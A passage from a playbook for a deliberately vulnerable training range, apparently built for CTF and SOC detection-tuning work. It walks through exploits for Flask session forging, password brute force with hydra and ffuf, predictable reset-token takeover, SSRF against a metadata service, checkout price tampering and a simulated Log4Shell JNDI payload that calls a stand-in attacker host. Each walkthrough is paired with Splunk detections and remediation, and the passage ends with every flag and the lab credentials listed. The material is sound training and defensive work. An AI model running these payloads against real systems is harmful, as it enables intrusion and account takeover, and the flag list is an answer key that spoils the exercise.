index=vapt_lab sourcetype=helpag:owasp:json (event_type=jwt_unsigned_accepted OR (event_type=jwt_verify algorithm=none))
| stats count values(subject) as subjects values(claimed_role) as roles by source_ip
```

Any token presented with `alg=none` is an attack. There is no benign case. This
is one of the two highest-fidelity alerts in the pack.

**Remediation** — pin the accepted algorithm server-side and reject everything
else; never read `alg` from the token to choose the verifier; use a vetted
library with an explicit `algorithms=["HS256"]` argument.

---

### 17. Sign Here Please — `auth-weak-secret` · 200 pts · hard

| | |
|---|---|
| **Vulnerability** | Session cookies signed with a guessable secret key |
| **Endpoint** | `GET /admin/panel` |
| **OWASP** | A02:2021 Cryptographic Failures |
| **MITRE** | T1110.002 Password Cracking · T1550.004 Web Session Cookie |

**Discovery** — the gate reads `is_admin` from the signed Flask session cookie.
Flask sessions are *signed, not encrypted*, so the contents are readable:

```bash
curl -s $BASE/admin/panel | jq
flask-unsign --decode --cookie "$(curl -sI $BASE/ | grep -i set-cookie | cut -d= -f2)"
```

**Recover the secret** — it appears in three places on the range (`/.env`,
`/backups/site-config.bak`, the engineering notes), or crack it:

```bash
flask-unsign --unsign --cookie "<session cookie>" --wordlist wordlists/helpag-secrets.txt
```

**Forge the session**

```bash
flask-unsign --sign --cookie "{'is_admin': True, 'user': 'attacker'}" \
             --secret 'deliberately-weak-lab-secret'
```

No `flask-unsign` installed? The repository ships an equivalent:

```bash
FORGED=$(.venv/bin/python tools/forge_session.py --secret 'deliberately-weak-lab-secret')
curl -s -H "Cookie: session=$FORGED" $BASE/admin/panel | jq
```

**Flag** `HELPAG{fl4sk_s3cr3t_w4s_1n_th3_w0rdl1st}`

**Detection — UC-14**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=forged_session_detected
| stats count values(reason) as reasons by source_ip user_agent
```

The application detects this by contradiction: `is_admin` is set in a session
that never completed an interactive administrator login. Reproduce that logic in
your own applications — a privileged session with no preceding authentication
event is the detection.

**Remediation** — generate the secret with a CSPRNG at deploy time, keep it in a
secret manager, rotate it on exposure, and never commit a default. Store
authorisation state server-side rather than in a client-held cookie.

---

### 18. No Lockout Policy — `auth-bruteforce` · 100 pts · easy

| | |
|---|---|
| **Vulnerability** | No rate limiting, no lockout, no delay; weak service account password |
| **Endpoint** | `POST /api/login` |
| **OWASP** | A07:2021 Identification and Authentication Failures |
| **MITRE** | T1110.001 Password Guessing · T1078.003 Valid Accounts: Local Accounts |

**Discovery** — the account list comes from `/backups/users-export.csv` or the
IDOR in challenge 5. `svc_backup` is the target.

**Exploitation**

```bash
for p in 123456 password letmein qwerty winter2024 summer2024 Passw0rd; do
  echo -n "$p -> "
  curl -s -X POST $BASE/api/login -H 'Content-Type: application/json' \
    -d "{\"username\":\"svc_backup\",\"password\":\"$p\"}"
  echo
done
```

With ffuf:

```bash
ffuf -u $BASE/api/login -X POST -H 'Content-Type: application/json' \
     -d '{"username":"svc_backup","password":"FUZZ"}' \
     -w /usr/share/wordlists/rockyou.txt -fc 401 -t 40
```

With Hydra:

```bash
hydra -l svc_backup -P /usr/share/wordlists/rockyou.txt \
      127.0.0.1 -s 5005 http-post-form \
      "/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:401"
```

**Credentials** `svc_backup` / `summer2024` → **Flag** `HELPAG{n0_r4t3_l1m1t_n0_l0ck0ut}`

**Detection — UC-13**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=authentication_attempt
| bin _time span=5m
| stats count(eval(success="false")) as failures count(eval(success="true")) as successes
        dc(username) as accounts values(username) as usernames by _time source_ip
| where failures>=5 OR (failures>=3 AND successes>=1)
```

The application also emits `brute_force_suspected` with `lockout_applied=false`
once a source passes five failures in sixty seconds. The *failure-then-success*
pattern is the alert that matters — a burst of failures alone is noise, a burst
followed by a success is a compromise.

Detect password spraying (one password, many accounts) with the inverse:

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=authentication_attempt success=false
| bin _time span=10m | stats dc(username) as accounts by _time source_ip | where accounts>=10
```

**Remediation** — rate limit per source and per account, apply progressive
delays and lockout, require MFA, and ban credentials found in breach corpora.
Service accounts should hold long random secrets, not seasonal passwords.

---

### 19. Predictable Reset — `auth-reset-token` · 150 pts · medium

| | |
|---|---|
| **Vulnerability** | Password reset tokens derived deterministically from the username |
| **Endpoints** | `POST /api/password-reset/request`, `POST /api/password-reset/consume` |
| **OWASP** | A02:2021 Cryptographic Failures |
| **MITRE** | T1110 Brute Force · T1556 Modify Authentication Process |

**Discovery** — request a reset for your own account; the token is echoed back:

```bash
curl -s -X POST $BASE/api/password-reset/request \
  -H 'Content-Type: application/json' -d '{"username":"alice"}' | jq
```

Compare it against hashes of your own username:

```bash
printf '%s' 'alice' | md5sum      # matches the issued token
```

**Exploitation** — compute the token for someone else and consume it:

```bash
TARGET=j.ellison
TOKEN=$(printf '%s' "$TARGET" | md5sum | cut -d' ' -f1)   # macOS: md5 -q

curl -s -X POST $BASE/api/password-reset/request \
  -H 'Content-Type: application/json' -d "{\"username\":\"$TARGET\"}"

BODY='{"username":"'"$TARGET"'","token":"'"$TOKEN"'"}'
curl -s -X POST $BASE/api/password-reset/consume \
  -H 'Content-Type: application/json' -d "$BODY" | jq
```

**Flag** `HELPAG{r3s3t_t0k3n_w4s_just_4n_md5}`

**Detection — UC-15**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type IN (password_reset_consume,account_takeover)
| stats count values(target_user) as targets values(token_valid) as valid by source_ip
```

`account_takeover` fires when a reset is consumed for an account other than the
requester's own. Correlate reset requests and consumptions by source: one source
resetting several accounts is an account-takeover campaign.

**Remediation** — generate reset tokens from a CSPRNG with at least 128 bits of
entropy, store only a hash of the token, bind it to the account and a short
expiry, and invalidate it on first use.

---

### 20. Ask The Neighbour — `ssrf-metadata` · 175 pts · medium

| | |
|---|---|
| **Vulnerability** | SSRF — the server fetches a URL supplied by the client |
| **Endpoint** | `GET /api/fetch?url=` |
| **OWASP** | A10:2021 Server-Side Request Forgery |
| **MITRE** | T1090 Proxy · T1552.005 Unsecured Credentials: Cloud Instance Metadata API |

**Discovery**

```bash
curl -sG $BASE/api/fetch --data-urlencode 'url=http://example.com' | jq
```

The 403 response lists the hosts the range will reach, which is your target list.

**Exploitation**

```bash
curl -sG $BASE/api/fetch --data-urlencode 'url=http://metadata:8080/latest/meta-data/' | jq
curl -sG $BASE/api/fetch --data-urlencode \
  'url=http://metadata:8080/latest/meta-data/iam/security-credentials/lab-instance-role' | jq
```

Running natively rather than in Docker, the metadata service is on
`http://127.0.0.1:8080`.

**Flag** `HELPAG{ssrf_r34ch3d_th3_m3t4d4t4_s3rv1c3}`

> Egress is bounded to an allow-list of lab-internal hosts on purpose, so this
> challenge cannot be used to pivot off the range or scan your corporate network.
> The vulnerability being taught — the server fetching a client-controlled URL —
> is intact; only the blast radius is contained.

**Detection — UC-16**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=ssrf_probe
| stats count values(target) as targets values(target_host) as hosts values(allowed) as allowed by source_ip
```

Alert on any server-side fetch aimed at loopback, RFC1918, link-local
(`169.254.169.254`) or an internal service name. In production, correlate with
egress proxy logs — a web server originating a request to the metadata IP is
almost always SSRF.

**Remediation** — allow-list destination hosts, resolve DNS before connecting and
re-check the resolved IP against the deny-list (defeating DNS rebinding), block
redirects, and require IMDSv2 session tokens on cloud instances.

---

### 21. Negative Nancy — `logic-negative` · 100 pts · easy

| | |
|---|---|
| **Vulnerability** | No server-side business rule validation |
| **Endpoint** | `POST /api/checkout` |
| **OWASP** | A04:2021 Insecure Design |
| **MITRE** | T1190 · T1565.001 Data Manipulation: Stored Data Manipulation |

**Exploitation**

```bash
curl -s -X POST $BASE/api/checkout -H 'Content-Type: application/json' \
  -d '{"quantity":-5,"unit_price":900}' | jq
```

Price tampering works too:

```bash
curl -s -X POST $BASE/api/checkout -H 'Content-Type: application/json' \
  -d '{"quantity":1,"unit_price":0.01}' | jq
```

**Flag** `HELPAG{n3g4t1v3_qu4nt1ty_cr3d1t3d_m3}`

**Detection — UC-17**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=business_logic_abuse negative_total=true
| stats count sum(total) as net_total values(quantity) as quantities by source_ip
```

Business logic abuse has no payload signature — no WAF will catch it. The
detection has to be built from the application's own domain model, which is
exactly the lesson: *some findings are only visible to instrumentation you write
yourself*.

**Remediation** — validate invariants server-side (quantity is a positive
integer within stock); never trust a client-supplied price — look it up by
product identifier.

---

### 22. Lookup Not Found — `inject-jndi` · 125 pts · medium

| | |
|---|---|
| **Vulnerability** | Log4Shell-class lookup syntax in a logged header (simulated) |
| **Endpoint** | `GET /api/legacy/audit` |
| **OWASP** | A06:2021 Vulnerable and Outdated Components |
| **MITRE** | T1190 · T1203 Exploitation for Client Execution |

**Discovery** — the component inventory names the vulnerable library and the
endpoint that uses it:

```bash
curl -s $BASE/api/components | jq
```

**Exploitation**

```bash
curl -s -H 'X-Audit-Agent: ${jndi:ldap://attacker.lab.invalid/a}' $BASE/api/legacy/audit | jq
```

The `User-Agent` header works as well:

```bash
curl -s -A '${jndi:ldap://attacker.lab.invalid/a}' $BASE/api/legacy/audit | jq
```

**Flag** `HELPAG{jnd1_l00kup_r34ch3d_th3_l0gg3r}`

> **Simulated by design.** No JNDI resolution, LDAP connection or class loading
> happens — the range records the attempt and returns the flag. The point is to
> generate the *telemetry* a real Log4Shell attempt would produce so you can
> prove your detection matches it, without shipping a working exploit primitive.

**Detection — UC-18**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=jndi_lookup_detected
| stats count values(audit_agent) as payloads by source_ip user_agent
```

Broader header hunting across any web sourcetype:

```spl
index=* (user_agent="*${jndi:*" OR user_agent="*${lower:*" OR _raw="*${jndi:*")
| stats count values(user_agent) as agents by index sourcetype src_ip
```

In production, the stronger signal is egress: a JVM making an outbound LDAP/RMI
connection to an unknown host. Pair the header detection with that.

**Remediation** — patch. Log4j 2.17.1 or later. Until then, never log
unsanitised request headers, and block outbound LDAP/RMI at the egress boundary.

---

## 8. Full attack chain

The challenges are not independent. Run them in this order and the range tells
one story — the story your SIEM should be able to reconstruct from events alone.

```
  Stage 1  RECON            robots.txt -> /internal/ -> /backups/ -> /.env
              |                                                        |
              |                                        secrets: session key, JWT key,
              |                                        svc_backup password
              v                                                        |
  Stage 2  EXPLOIT          SQLi -> schema -> flags table               |
                            SSTI probe -> {{7*7}} -> runtime            |
                            cmdi -> shell as `lab`                      |
              |                                                        |
              v                                                        v
  Stage 3  PRIVESC          mass assignment -> role=admin      JWT alg:none -> admin
                            forged Flask session -> /admin/panel  <----+
              |
              v
  Stage 4  OBJECTIVE        SSRF -> metadata -> cloud credentials
                            traversal / XXE -> arbitrary file read
                            dangerous upload -> foothold
```

Run the whole chain from one source address, then fire UC-21:

```spl
index=vapt_lab sourcetype=helpag:owasp:json
| eval stage=case(
    event_type IN ("recon_robots_read","recon_hidden_path","http_not_found"),"1-recon",
    event_type IN ("sql_query","xss_probe","ssti_attempt","xxe_attempt",
                   "command_injection_attempt","path_traversal_attempt"),"2-exploit",
    event_type IN ("privilege_change","jwt_unsigned_accepted",
                   "forged_session_detected","account_takeover"),"3-privesc",
    event_type IN ("command_execution","dangerous_upload",
                   "sensitive_file_access","ssrf_probe"),"4-objective")
| search stage=*
| stats dc(stage) as stages values(stage) as observed values(event_type) as events
        min(_time) as first max(_time) as last by source_ip
| where stages>=3
```

A source that touches three or more stages inside an hour is a confirmed
intrusion, not a scan. This is the alert to take to a SOC review — the
individual-technique alerts below it are the supporting evidence.

### Why this matters for tuning

Run the range twice and compare:

1. **A vulnerability scanner** (Nikto, ZAP, Nuclei) — enormous volume, hits
   stages 1 and 2, almost never reaches 3 or 4.
2. **A human following this playbook** — low volume, but progresses cleanly
   through all four stages.

If your alerting cannot tell those two apart, that is the finding. Volume-based
detections drown in the first case and miss the second.

---

## 9. Validation

The repository ships a harness that solves all 22 challenges, submits each flag
and reports pass or fail. Use it to verify a deployment and to generate a
complete, reproducible event set for detection tuning.

```bash
# Docker deployment
./tools/validate_range.sh http://127.0.0.1:5005

# Native deployment (paths and interpreter differ)
APP_ROOT="$PWD" METADATA_URL="http://127.0.0.1:8080" \
  PYTHON="$PWD/.venv/bin/python" ./tools/validate_range.sh http://127.0.0.1:5005
```

Expected output ends with:

```
== 22 passed, 0 failed ==
```

Environment variables the harness accepts:

| Variable | Default | Purpose |
|---|---|---|
| `APP_ROOT` | `/app` | Absolute path used by the XXE payload |
| `METADATA_URL` | `http://metadata:8080` | SSRF target base URL |
| `PYTHON` | `python3` | Interpreter with Flask installed, for session forging |
| `TEAM` | `validation-bot` | Team name to register |

A clean run produces roughly 140 events across 35 distinct `event_type` values —
enough to exercise every use case in the pack at once:

```bash
jq -r .event_type logs/helpag-events.jsonl | sort | uniq -c | sort -rn
```

Unit tests:

```bash
.venv/bin/python -m unittest discover -s tests -v
```

---

## 10. Instructor operations

### Reset the range between sessions

```bash
docker compose down
rm -rf logs uploads/*
docker compose up -d
```

This clears the scoreboard, the guestbook, uploaded files and the event log. The
flags themselves are baked into the image and do not change.

### Watch progress live

```bash
watch -n 5 'curl -s http://127.0.0.1:5005/api/ctf/scoreboard | jq -r ".teams[] | \"\(.rank) \(.team) \(.points)\""'
curl -s http://127.0.0.1:5005/api/ctf/progress | jq -r '.progress[] | "\(.solves)\t\(.title)"' | sort -rn
```

### Tail the event stream

```bash
tail -f logs/helpag-events.jsonl | jq -c '{t:.timestamp,ip:.source_ip,e:.event_type,s:.severity}'
```

### Change the flags

Flags live in [`labsite/catalog.py`](labsite/catalog.py). Edit the `flag` value
on a challenge, then rebuild — the scoreboard verifies by SHA-256 computed at
import, and the fixture files under `flagstore/`, `backups/` and `metadata/` are
regenerated from the catalogue by:

```bash
python3 tools/seed_fixtures.py
```

Remember to update this playbook when you do, or run
`python3 tools/check_playbook.py` to be told which flags have drifted.

### Adding a challenge

1. Append an entry to `CHALLENGES` in `labsite/catalog.py` (id, points, MITRE
   mapping, detection event names).
2. Implement the vulnerable endpoint in `labsite/challenges.py`, calling
   `award("<id>")` on success and `emit_event(...)` on both success and attempt.
3. Add a detection stanza to `splunk/TA-helpag-vapt/default/savedsearches.conf`.
4. Add a walkthrough to section 7 of this file.
5. Add a case to `tools/validate_range.sh` and re-run it.

The board, scoreboard, progress API and MITRE matrix all read from the
catalogue, so steps 1–3 are the only code changes required.

---

## Appendix A — All flags

| Challenge | Flag |
|---|---|
| `recon-robots` | `HELPAG{r0b0ts_txt_1s_n0t_4cc3ss_c0ntr0l}` |
| `misconfig-debug` | `HELPAG{d3bug_3ndp01nt_sh1pp3d_t0_pr0d}` |
| `misconfig-dotenv` | `HELPAG{d0t3nv_s3rv3d_fr0m_w3br00t}` |
| `misconfig-backups` | `HELPAG{b4ckup_f1l3_l3ft_b3h1nd}` |
| `access-idor` | `HELPAG{1d0r_h0r1z0nt4l_3num3r4t10n}` |
| `access-massassign` | `HELPAG{m4ss_4ss1gnm3nt_r0l3_0v3rwr1t3}` |
| `inject-sqli-union` | `HELPAG{un10n_s3l3ct_dump3d_th3_fl4g_t4bl3}` |
| `inject-sqli-auth` | `HELPAG{sql_4uth_byp4ss_t4ut0l0gy}` |
| `xss-reflected` | `HELPAG{r3fl3ct3d_xss_1nt0_th3_d0m}` |
| `xss-stored` | `HELPAG{st0r3d_xss_p3rs1sts_f0r_3v3ry0n3}` |
| `file-traversal` | `HELPAG{p4th_tr4v3rs4l_0uts1d3_th3_r00t}` |
| `rce-cmdi` | `HELPAG{c0mm4nd_1nj3ct10n_g4v3_m3_4_sh3ll}` |
| `rce-ssti` | `HELPAG{j1nj4_sst1_r34ch3d_th3_runt1m3}` |
| `inject-xxe` | `HELPAG{xx3_3xt3rn4l_3nt1ty_f1l3_r34d}` |
| `upload-unrestricted` | `HELPAG{unr3str1ct3d_upl04d_w3bsh3ll}` |
| `auth-jwt-none` | `HELPAG{jwt_4lg_n0n3_4cc3pt3d_by_th3_4p1}` |
| `auth-weak-secret` | `HELPAG{fl4sk_s3cr3t_w4s_1n_th3_w0rdl1st}` |
| `auth-bruteforce` | `HELPAG{n0_r4t3_l1m1t_n0_l0ck0ut}` |
| `auth-reset-token` | `HELPAG{r3s3t_t0k3n_w4s_just_4n_md5}` |
| `ssrf-metadata` | `HELPAG{ssrf_r34ch3d_th3_m3t4d4t4_s3rv1c3}` |
| `logic-negative` | `HELPAG{n3g4t1v3_qu4nt1ty_cr3d1t3d_m3}` |
| `inject-jndi` | `HELPAG{jnd1_l00kup_r34ch3d_th3_l0gg3r}` |

## Appendix B — Synthetic credentials

Every account below is fictional and exists only in this lab's SQLite database.

| id | Username | Password | Role | Used by |
|---|---|---|---|---|
| 1 | `alice` | `Password1` | user | reset-token discovery |
| 2 | `admin` | `admin` | admin | default-credentials demo |
| 3 | `bob` | `hunter2` | user | filler |
| 7 | `svc_backup` | `summer2024` | service | `auth-bruteforce` |
| 1337 | `j.ellison` | `Tr0ub4dour&3` | finance | `access-idor`, `auth-reset-token` |

## Appendix C — Tooling checklist

| Tool | Used for |
|---|---|
| `curl`, `jq` | Every challenge; the playbook's baseline |
| `ffuf` / `gobuster` | Challenges 3, 4, 5 — content and identifier discovery |
| `sqlmap` | Challenge 7 — and the loudest UC-06 trigger available |
| `hydra` / `ffuf` | Challenge 18 — credential brute force |
| `flask-unsign` | Challenge 17 — session decode, crack and forge |
| Burp Suite | Repeater and Intruder for all of the above; see [`BURP_SUITE_TEST_GUIDE.md`](BURP_SUITE_TEST_GUIDE.md) |
| Nikto / ZAP / Nuclei | Volume baseline for tuning (section 8) |
